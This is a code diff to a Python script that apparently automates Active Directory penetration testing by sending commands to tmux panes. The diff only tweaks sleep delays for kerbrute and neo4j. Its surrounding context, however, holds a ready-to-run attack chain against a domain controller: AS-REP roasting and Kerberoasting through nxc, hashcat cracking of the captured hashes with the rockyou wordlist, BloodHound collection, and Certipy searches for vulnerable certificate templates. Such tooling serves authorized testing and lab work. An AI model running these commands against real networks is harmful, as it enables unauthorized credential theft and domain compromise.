@@ -39,7 +39,7 @@ def run_task(context, command):
     if target_pane:
         if "nxc" in command:
             target_pane.send_keys(f"sleep 7; {command}") # Prevents NetBIOSTimeout exception
-        elif "kerbrute" in command:
+        elif "kerbrute" in command or "neo4j" in command:
             target_pane.send_keys(f"sleep 20; {command}")
         else:
             target_pane.send_keys(f"sleep {context.current_task_pane * 2}; {command}")
@@ -135,7 +135,7 @@ def ldap_tasks(context):
         user, passwd = context.get_initial_cred()
         run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" bloodyAD --host {target} -d {context.domain} -u {user} -p '{passwd}' -k get writable; echo; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' -k --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' -k -M maq -M sccm -M laps -M adcs -M pre2k; echo; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet; bloodhound.py --zip -c All -d {context.domain} -dc {target} -ns {context.ip} -u {user} -p '{passwd}'")
         run_task(context, f"rm -f $(pwd)/initial_enabled_Certipy.json; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -json -output initial_enabled -timeout 2 -enabled; echo -e '\n<--- Find Vulnerable: --->\n'; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -json -timeout 2 -vulnerable; echo; parse_certipy.py initial_enabled_Certipy.json; echo; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" powerview {context.domain}/{user}:'{passwd}'@{target} -k --web")
-        run_task(context, "neo4j start; sleep 10; bloodhound &> /dev/null & disown")
+        run_task(context, "neo4j start; sleep 5; bloodhound &> /dev/null & disown")
     else:
         if anonymous_bind(context):
             write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
